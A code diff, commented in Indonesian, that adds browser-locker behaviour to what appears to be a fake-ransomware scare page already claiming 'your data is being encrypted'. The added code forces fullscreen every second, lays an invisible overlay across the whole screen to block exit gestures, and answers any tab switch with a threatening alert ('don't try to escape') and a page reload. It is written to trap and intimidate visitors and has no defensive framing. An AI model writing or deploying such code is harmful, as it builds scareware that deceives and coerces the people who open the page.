@@ -36,3 +36,30 @@ window.onpopstate = function () {
 window.onbeforeunload = function () {
     return "Data Anda sedang dienkripsi! Yakin ingin keluar?";
 };
+
+// Paksa Fullscreen jika keluar
+function forceFullscreen() {
+    if (document.fullscreenElement === null) {
+        document.documentElement.requestFullscreen();
+    }
+}
+setInterval(forceFullscreen, 1000);
+
+// Blokir semua gesture keluar dengan overlay transparan
+let overlay = document.createElement("div");
+overlay.style.position = "fixed";
+overlay.style.top = "0";
+overlay.style.left = "0";
+overlay.style.width = "100%";
+overlay.style.height = "100%";
+overlay.style.zIndex = "9999";
+overlay.style.background = "rgba(0,0,0,0)";
+document.body.appendChild(overlay);
+
+// Cegah refresh atau pindah tab dengan loop peringatan
+document.addEventListener("visibilitychange", function() {
+    if (document.hidden) {
+        alert("Jangan coba-coba kabur!");
+        location.reload();
+    }
+});
